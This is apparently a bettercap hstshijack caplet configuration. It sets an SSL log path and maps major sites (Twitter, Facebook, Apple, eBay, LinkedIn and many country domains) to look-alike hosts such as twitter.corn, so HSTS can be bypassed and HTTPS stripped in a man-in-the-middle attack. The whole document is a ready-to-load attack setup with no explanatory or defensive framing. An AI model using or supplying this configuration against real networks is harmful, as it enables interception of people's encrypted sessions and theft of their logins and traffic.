set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
set hstshijack.ignore          *
set hstshijack.targets         twitter.com,*.twitter.com,facebook.com,*.facebook.com,apple.com,*.apple.com,ebay.com,*.ebay.com,*.linkedin.com,linkedin.com,*.com, *.ar, *.au, *.be, *.br, *.io, *.vg, *.bg, *.ca, *.cn, *.cc, *.co, *.dk, *.eg, *.uk, *.co.uk, *.eu, *.fr, *.de, *.gr, *.nl, *.in, *.ir, *.ie, *.jp, *.jo, *.kr, *.co.il, *.fm, *.sh,
set hstshijack.replacements    twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,*.linkedin.com,linkedin.com,*.com, *.ar, *.au, *.be, *.br, *.io, *.vg, *.bg, *.ca, *.cn, *.cc, *.co, *.dk, *.eg, *.uk, *.co.uk, *.eu, *.fr, *.de, *.gr, *.nl, *.in, *.ir, *.ie, *.jp, *.jo, *.kr, *.co.il, *.fm, *.sh
